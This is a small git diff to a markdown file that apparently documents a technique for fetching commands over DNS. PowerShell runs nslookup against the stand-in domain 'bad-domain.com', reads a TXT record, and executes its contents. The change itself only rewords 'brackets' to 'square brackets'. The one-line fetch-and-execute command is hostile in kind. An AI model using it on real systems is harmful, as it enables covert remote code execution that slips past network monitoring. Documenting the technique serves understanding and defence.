@@ -4,7 +4,7 @@ Client executing:.<br>
 `powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
 DNS Server TXT entry:<br>
 `ping google.com`<br><br>
-*EXPLANATION: nslookup.exe calls the TXT entry through DNS as subprocess from powershell. This way the stored commands get transmitted over DNS and executed in the context of the current (powershell) process. The number in the brackets stands for the index (five being the first possible one) of the command. It is also possible to use "[-1]" should there be only a single command available as TXT entry.*<br><br>
+*EXPLANATION: nslookup.exe calls the TXT entry through DNS as subprocess from powershell. This way the stored commands get transmitted over DNS and executed in the context of the current (powershell) process. The number in the square brackets stands for the index (five being the first possible one) of the command. It is also possible to use "[-1]" should there be only a single command available as TXT entry.*<br><br>
 
 The outcome is `powershell ping google.com` being executed in the current session on the clients system.
 
